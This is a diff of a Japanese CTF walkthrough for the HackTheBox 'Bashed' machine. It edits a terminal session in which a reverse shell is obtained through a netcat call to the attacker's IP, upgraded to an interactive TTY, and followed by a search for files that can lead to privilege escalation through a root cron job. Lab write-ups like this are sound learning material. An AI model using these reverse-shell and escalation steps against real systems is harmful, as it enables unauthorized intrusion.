@@ -97,36 +97,24 @@ www-data@bashed:/var/www/html/dev# sudo -u scriptmanager busybox nc 10.10.16.4 4
 scriptmanager権限のリバースシェル取得！  
 しかし/rootにはアクセスできず、権限昇格を目指す  
 ```sh
-└─$ rlwrap nc -lnvp 4444 
+└─$ nc -lnvp 4444 
 listening on [any] 4444 ...
 connect to [10.10.16.4] from (UNKNOWN) [10.129.9.62] 37366
 
-id
-uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
+python -c 'import pty; pty.spawn("/bin/bash")'
 
-tty
-not a tty
-
-zsh: suspended  rlwrap nc -lnvp 4444 
-
-└─$ echo $TERM && tput lines && tput cols
-xterm-256color
-59
-236
+scriptmanager@bashed:/var/www/html/dev$ ^Z
+zsh: suspended  nc -lnvp 4444
 
 └─$ stty raw -echo; fg
-[1]  + continued  rlwrap nc -lnvp 4444
+[1]  + continued  nc -lnvp 4444
+                               ^C
 
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows 59 columns 236
-python -c 'import pty; pty.spawn("/bin/bash")'
-scriptmanager@bashed:/var/www/html/dev$ 
+scriptmanager@bashed:/var/www/html/dev$ export SHELL=bash
 
-scriptmanager@bashed:/var/www/html/dev$ tty
-tty
-/dev/pts/0
+scriptmanager@bashed:/var/www/html/dev$ export TERM=xterm-256color
+
+scriptmanager@bashed:/var/www/html/dev$ stty rows 66 columns 236
 
 scriptmanager@bashed:/var/www/html/dev$ ls /root
 ls /root
@@ -137,7 +125,7 @@ ls: cannot open directory '/root': Permission denied
 ## STEP 4
 scriptmanager所有のファイルを検索  
 ```sh
-scriptmanager@bashed:/var/www/html/dev$$ find / -not -path '/proc/*' -user scriptmanager 2> /dev/null 
+scriptmanager@bashed:/var/www/html/dev$ find / -not -path '/proc/*' -user scriptmanager 2> /dev/null 
 <d / -not -path '/proc/*' -user scriptmanager 2> /dev/null                   
 /scripts
 /scripts/test.py
@@ -153,7 +141,7 @@ scriptmanager@bashed:/var/www/html/dev$$ find / -not -path '/proc/*' -user scrip
 test.pyはtest.txtを作成するっぽい  
 test.txtはroot権限  
 root権限でtest.pyが実行され、作成されたtest.txtはroot権限になると推測  
-root権限のCronでtest.pyが実行されているかも
+root権限のcronでtest.pyが実行されているかも
 ```sh
 scriptmanager@bashed:/var/www/html/dev$ cd /scripts
 cd /scripts
